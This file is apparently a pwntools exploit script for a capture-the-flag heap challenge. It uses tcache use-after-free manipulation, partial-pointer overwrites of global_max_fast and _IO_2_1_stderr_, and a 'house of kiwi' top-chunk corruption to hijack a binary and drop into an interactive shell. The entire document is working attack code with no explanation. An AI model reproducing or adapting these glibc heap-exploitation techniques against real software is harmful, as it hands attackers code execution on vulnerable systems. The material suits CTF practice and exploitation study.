#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1615 

        c
        ''')
        input()


if args.REMOTE:
    p = remote('localhost', 1337)
else:
    p = process(exe.path)

def add(sz):
    sla(b'>', '1')
    sla(b'? ', str(sz))


def delete(idx):
    sla(b'>', '3')
    sla(b':', str(idx))


def edit(idx, pa):
    sla(b'>', '2')
    sla(b':', str(idx))
    sa(b':', (pa))


# prepare for write_...
add(0x14b0)  # 0 write_base
add(0x14c0)  # 1 write_ptr
add(0x14d0)  # 2 write_end
# padding
for i in range(7):
    add(0x50)   # 3-9
for i in range(7):
    add(0x60)  # 10-16
# prepare
add(0x90)  # 17
add(0x90)  # 18
add(0x90)  # 19
# paddin
for i in range(3, 10):
    delete(i)
for i in range(10, 17):
    delete(i)
# Copy address for UAF
delete(17)  # 3 = 17
add(0x90)   # 3
delete(18)  # 4 = 18
add(0x90)   # 4
# tcache for global_max_fast
for i in range(7):
    delete(17)
    edit(3, b'a'*0x10)
delete(17)
add(0x10)   # 5
# GDB()
edit(3, p16(0xaea0))
add(0x90)
add(0x90)   # 7 #global_max_fast
add(0x70)   # 8 clean unsorted bin
# tcache for _IO_2_1_stderr_
for i in range(2):
    delete(18)
    edit(4, b'a'*0x10)
delete(18)
add(0x10)   # 9
edit(4, p16(0x95c0))
add(0x90)
add(0x90)   # 11 _IO_2_1_stderr_
add(0x70)   # 12 clean unsorted bin
# house of kiwi to overwrite topchunk
add(0x10)   # 13
add(0x10)   # 14
add(0x420)  # 15
delete(13)
delete(14)
delete(15)
add(0x420)  # 13 = 15
delete(15)
add(0x410)  # 13
edit(13, b'\x00'*0x410 + flat(0, 0x231))
# 
edit(7, b'aaaa')
delete(0)
delete(1)
delete(2)
# GDB()
edit(11, flat(0xfbad1800, 0,0,0) + b'\0')
edit(7, p32(0x80))

add(0x666)
# sleep(1)
# p.close()
p.interactive()


